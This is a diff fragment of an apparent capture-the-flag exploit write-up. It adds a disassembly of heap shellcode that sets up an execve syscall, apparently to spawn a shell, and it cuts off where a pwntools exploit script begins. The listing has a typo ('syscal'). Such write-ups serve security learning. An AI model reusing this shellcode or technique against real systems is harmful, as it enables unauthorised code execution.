@@ -145,6 +145,19 @@ I set `0x01` to the address of `rdx (0x555555559260)` to use the following instr
 add cl, byte PTR [rdx] 
 ```
 
+Finally, I created the following shellcode in heap memory.
+
+```
+=> 0x0000555555559460:	push   rdx
+   0x0000555555559461:	pop    rdi
+   0x0000555555559462:	add    rdi,0x30f
+   0x0000555555559469:	xor    esi,esi
+   0x000055555555946b:	xor    edx,edx
+   0x000055555555946d:	push   0x3b
+   0x000055555555946f:	pop    rax
+   0x0000555555559470:	syscal
+```
+
 ## Exploit code:
 ```python
 from pwn import *
